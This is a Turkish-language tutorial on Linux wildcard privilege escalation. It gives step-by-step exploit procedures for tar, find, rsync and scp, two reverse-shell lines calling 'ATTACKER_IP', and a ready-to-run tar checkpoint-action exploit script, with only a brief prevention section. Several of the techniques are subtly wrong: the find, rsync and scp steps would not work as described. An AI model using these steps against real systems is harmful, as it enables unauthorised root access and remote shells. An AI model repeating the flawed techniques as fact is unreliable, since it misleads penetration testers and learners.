Wildcard yoluyla hak yükseltme (Wildcard Privilege Escalation), Linux sistemlerinde dosya sistemindeki joker karakterlerin yanlış veya tehlikeli şekilde kullanılması nedeniyle ortaya çıkan bir zafiyettir. Bu tür zafiyetler genellikle kötü yapılandırılmış **tar**, **rsync**, **find**, **scp** gibi komutların otomatik süreçlerde çalıştırılması durumunda meydana gelir. İşte bu zafiyetin detaylı teknik analizi ve nasıl exploit edileceğine dair bir rehber:

---

### **1. Wildcard (Joker Karakter) Nedir?**
- Joker karakterler, belirli bir dosya veya dosya grubu yerine kullanılan sembollerdir.
- **\***: Herhangi bir karakter dizisiyle eşleşir.
- **?**: Tek bir karakterle eşleşir.
- **[ ]**: Belirtilen karakter aralığıyla eşleşir.

**Örnek:**
```bash
ls *.txt  # Bulunduğunuz dizindeki tüm .txt dosyalarını listeler.
```

---

### **2. Wildcard Zafiyeti Nasıl Oluşur?**
Wildcard kullanımı sırasında bazı komutlar joker karakterlerle genişletilmiş girişleri işler. Örneğin:
- `tar` ile dosya arşivleme sırasında `--checkpoint-action` parametresi.
- `find` komutu ile dosya arama sırasında `-exec` parametresi.
- `rsync` ile dosya senkronizasyonunda wildcardların yanlış kullanımı.

---

### **3. Exploit Edilebilecek Durumlar**

#### **a. Tar Komutu ile Exploit**
`tar` komutunda wildcardlarla tehlikeli bir betik veya komut çalıştırılabilir. Örneğin:
```bash
tar -cf archive.tar *
```
Eğer dizinde `--checkpoint-action=exec=sh` gibi bir dosya adı varsa, bu dosya bir komut gibi çalıştırılır.

##### **Exploit Adımları:**
1. Çalıştırılan komutun wildcard kabul edip etmediğini kontrol edin:
   ```bash
   ps aux | grep tar
   ```
2. Tehlikeli dosyaları oluşturun:
   ```bash
   echo "echo 'root yetkisine ulaşıldı' > /tmp/rooted" > shell.sh
   chmod +x shell.sh
   touch "--checkpoint-action=exec=sh shell.sh"
   ```
3. Kullanıcı veya cron bu komutu çalıştırdığında, shell.sh tetiklenir ve komutunuz çalışır.

---

#### **b. Find Komutu ile Exploit**
`find` komutunun `-exec` parametresi ile wildcardları genişletmesi, komut enjeksiyonuna yol açabilir.

##### **Exploit Adımları:**
1. Çalıştırılan find komutunun parametrelerini gözlemleyin:
   ```bash
   ps aux | grep find
   ```
2. Joker karakterlerden faydalanarak tehlikeli dosyalar oluşturun:
   ```bash
   echo "/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" > exploit.sh
   chmod +x exploit.sh
   touch "exploit.sh"
   ```
3. Bulunan dosya `find` ile işlenirken `exploit.sh` çalıştırılır.

---

#### **c. Rsync ile Exploit**
Rsync komutunda joker karakterler belirli parametrelerle birlikte kullanıldığında zararlı komutların tetiklenmesine yol açabilir.

##### **Exploit Adımları:**
1. Rsync çalıştıran bir cron veya işlem tespit edin.
   ```bash
   ps aux | grep rsync
   ```
2. Exploit dosyası oluşturun:
   ```bash
   touch 'file;bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1;'
   ```
3. Rsync çalıştırıldığında komut yürütülür.

---

#### **d. Scp ile Exploit**
SCP joker karakterleri genişletip bir dosya yerine komut çalıştırabilir.

##### **Exploit Adımları:**
1. Sistemde scp çalıştırılıyorsa şunları kontrol edin:
   ```bash
   ps aux | grep scp
   ```
2. Tehlikeli bir dosya adı oluşturun:
   ```bash
   touch "`echo /bin/bash > /tmp/shell.sh`"
   chmod +x /tmp/shell.sh
   ```
3. SCP ile çalıştırıldığında, exploit tetiklenir.

---

### **4. Önleme Yöntemleri**
1. **Wildcard kullanırken dikkatli olun**: Joker karakterlerin genişletilmesi engellenmeli.
2. **Komutlarda parametre kontrollerini sıkılaştırın**:
   - `--checkpoint-action` gibi parametreleri kısıtlayın.
3. **Yönetici haklarına sahip otomatik işlemleri izole edin**: Bu işlemler bir chroot ortamında çalıştırılmalı.
4. **Güvenli dosya izinleri kullanın**:
   - İşletim sistemi dizinlerini yalnızca root erişimine açık hale getirin.
5. **Kritik işlemler için tam dosya adları kullanın**:
   - Örneğin, `*.txt` yerine `file1.txt file2.txt` gibi.

---

### **5. Örnek Exploit Scripti**
Aşağıdaki script, wildcard zafiyetini tar komutu üzerinden kullanır.

```bash
#!/bin/bash

echo "[*] Wildcard Exploit ile Tar Zafiyeti Kullanımı"
echo "Exploit Dosyalarını Oluşturuyor..."

echo "echo 'Hacked by Wildcard Exploit' > /tmp/hacked" > payload.sh
chmod +x payload.sh

touch "--checkpoint-action=exec=sh payload.sh"
touch "--checkpoint=1"

echo "[+] Exploit Dosyaları Hazır! Şimdi tar komutunu çalıştırın."
echo "tar -cf archive.tar *"
```

---

### **6. Sonuç**
Wildcard zafiyetleri, genellikle güvenli olmayan otomasyon süreçleri ve kötü dosya adı kontrolünden kaynaklanır. Sistem yöneticileri joker karakter kullanımını minimize etmeli ve hassas işlemleri root yetkileri dışında çalıştırmalıdır. Bu zafiyetlerin farkında olmak, pen-test süreçlerinde kritik bir avantaj sağlar.
